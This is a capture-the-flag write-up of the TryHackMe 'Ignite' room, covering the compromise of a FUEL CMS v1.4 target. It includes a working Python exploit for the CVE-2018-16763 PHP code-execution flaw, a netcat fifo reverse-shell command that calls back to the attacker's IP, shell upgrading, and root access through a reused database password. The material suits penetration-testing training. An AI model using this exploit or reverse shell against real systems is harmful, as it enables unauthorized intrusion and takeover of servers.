---
layout: post
title: PenLog - &quot;Ignite&quot; by TryHackMe
categories: [TryHackMe, Penlog, Write Up, CTF, OSCP]
---

## Details

**Platform:** [TryHackMe](https://www.tryhackme.com/)\
**Difficulty:** Easy\
**Link:** [Ignite](https://tryhackme.com/room/ignite)

## Enumeration

Run `nmap` default port scan on target with TCP connect/version/script options:

```bash
$ nmap -vv -Pn -sT -sV -sC 10.10.211.150
```

This results in:

![nmap1](/images/posts/penlog_ignite_by_tryhackme/nmap1.png)
_(**Note:** http-title "Welcome to FUEL CMS".)_

Google "FUEL CMS" and note description on [website](https://www.getfuelcms.com/):

_"The content management system for premium-grade websites."_

Open browser an navigate to target's open http port 80; note FUEL CMS version v1.4:

![fuelcms](/images/posts/penlog_ignite_by_tryhackme/fuelcms.png)

Also note mention of default credentials:

![fuelcms-creds](/images/posts/penlog_ignite_by_tryhackme/fuelcms_creds.png)
_(**Note:** Logging in to the portal proved useless.)_

Taking a chance on this, use `searchsploit` and evaluate results:

```bash
$ searchsploit fuelcms 1.4
...
```

![searchsploit](/images/posts/penlog_ignite_by_tryhackme/searchsploit_fuelcms.png)
_(**Note:** "ss" in the above is a bash alias for `searchsploit`.)_

Download the PoC with EDB ID [47138](https://www.exploit-db.com/exploits/47138):

```bash
$ searchsploit -m 47138
$ dos2unix 47138
```

### 47138 Description

47138 demonstrates a PHP code execution vulnerability where un-trusted input results in 
Remote Code Execution (RCE). Looking at the code, the vulnerable parameter is highlighted by the `burp0_url`
variable:

```python
burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
```

The URL encoded data can be decoded like so:

```bash
$ python -c 'import urllib;print(urllib.unquote("%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\"+urllib.quote(xxxx)+\"%27%29%2b%2"))'
```

![urldecode-filter](/images/posts/penlog_ignite_by_tryhackme/urldecode_filter.png)

As shown in the decoded PHP code, a call to PHP's `system` results in code execution.

## User Shell

I re-wrote the 47138 PoC (_fuelpwn.py_) and stripped out printing of the GET request response and built-in
support for the Burp Suite proxy:

```python
"""
FUEL CMS v1.4.1 CVE-2018-16763 PoC.

This PoC was derived from: https://www.exploit-db.com/exploits/47138.
"""
import argparse
import urllib
import requests

parser = argparse.ArgumentParser('Fuel CMS v1.4 CVE-2018-16763 PoC')

parser.add_argument('url', type=str, help='URL to target, e.g. http://127.0.0.1')
parser.add_argument('cmd', type=str, help='Command to execute')
args = parser.parse_args()

url=args.url
cmd=args.cmd

payload="'+pi(print($a='system'))+$a('"+cmd+"')+'"
payload_enc=urllib.quote(payload)  # URL encoded payload
filter_path='/fuel/pages/select/?filter='+payload_enc

try:
    _ = requests.get(url+filter_path)
except:
    pass
```
_(**Note:** You can download my port [here](https://gist.github.com/wulfgarpro/d302038d40e4aab46a5b61d876b01b93).)_

This port simplifies getting a reverse shell.

Start a `nc` reverse listener on port 4444:

```bash
$ nc -vnlp 4444
```

Run _fuelpwn.py_ supplying target URL and command to execute connecting back to the attacking machine - use fifo since `nc` on target does not have support for `-e` (see `man nc`):

```bash
$ python fuelpwn.py http://10.10.211.150 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.9.232 4444 >/tmp/f"
```

![user-shell](/images/posts/penlog_ignite_by_tryhackme/user_shell.png)
_(**Note:** "reverse" in the above is a bash alias for `nc -vnlp 4444`.)_

Upgrade the shell with a PTY:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ (Ctrl-Z)
$ stty raw -echo
$ fg
$ export TERM=xterm && reset
```

Get the user _flag.txt_:

![user-flag](/images/posts/penlog_ignite_by_tryhackme/user_flag.png)

## Root Shell

Track down the FUEL CMS _config_ directory and use `grep` to find database password:

![dbpassword](/images/posts/penlog_ignite_by_tryhackme/dbpassword.png)

Perform the same to find username:

![dbusername](/images/posts/penlog_ignite_by_tryhackme/dbusername.png)

Notice the username is _root_; test for password re-use against _root_ user and get _root.txt_:

![root-shell](/images/posts/penlog_ignite_by_tryhackme/root_shell.png)
_(**Note:** supplied password was **mememe**.)_